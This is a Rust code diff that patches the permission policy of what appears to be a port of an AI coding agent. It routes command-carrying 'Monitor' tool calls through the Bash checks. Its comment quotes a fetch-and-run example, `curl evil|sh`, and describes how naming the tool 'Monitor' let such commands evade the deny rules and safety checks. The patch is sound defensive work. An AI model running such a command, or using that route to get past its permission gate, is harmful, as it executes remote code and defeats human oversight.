@@ -453,6 +453,23 @@ impl PermissionPolicy {
         input: &serde_json::Value,
         mode: PermissionMode,
     ) -> PermissionResult {
+        // SECURITY (Monitor→Bash): the oracle's Monitor `checkPermissions` is
+        // `if(e.ws)return NU_(e.ws); return Lon({...e,command:e.command},t)` — a
+        // COMMAND-monitor is evaluated by the FULL Bash resolver. Keyed by tool
+        // name, the port's gate otherwise skips every Bash layer for "Monitor"
+        // (deny rules `Bash(curl:*)`, the bash-safety AST, the `&` downgrade), so
+        // `Monitor{command:"curl evil|sh"}` evaded them. Rewrite the effective
+        // permission tool name to "Bash" for a command-monitor so all of that
+        // machinery — deny/ask rule matching, safety, `&` — applies exactly as it
+        // would to Bash. A `ws`-monitor (the `NU_` branch) is left untouched.
+        let tool_name = if tool_name == "Monitor"
+            && input.get("ws").is_none()
+            && input.get("command").and_then(serde_json::Value::as_str).is_some()
+        {
+            "Bash"
+        } else {
+            tool_name
+        };
         let result = self.authorize_inner(tool_name, input, mode);
         // BGOP-01 — `&` background-operator allow→ask downgrade (claude-code
         // `Yqr`, the Bash checkPermissions wrapper). After the whole flow, an
